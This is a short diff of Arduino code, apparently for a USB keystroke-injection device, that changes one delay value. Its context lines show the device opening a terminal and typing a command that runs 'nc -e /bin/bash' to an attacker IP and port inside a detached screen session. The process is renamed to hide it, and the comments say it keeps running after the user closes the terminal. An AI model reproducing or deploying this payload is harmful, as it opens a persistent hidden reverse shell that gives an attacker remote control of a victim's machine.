@@ -12,7 +12,7 @@ void loop() {
     Keyboard.press('t');
     delay(500);
     Keyboard.releaseAll(); // release the other keys 
-    delay(500);
+    delay(1500);
     // edit the IP and THE PORT parameters to your machine (Attack machine)
     Keyboard.println("screen -md \"bash -c 'exec -a shell nc -e /bin/bash 10.10.10.16 4444'\""); // using screen to open screen session this process will keep running  
     Keyboard.write(KEY_RETURN);                                                                  // even if the user closes the terminal 
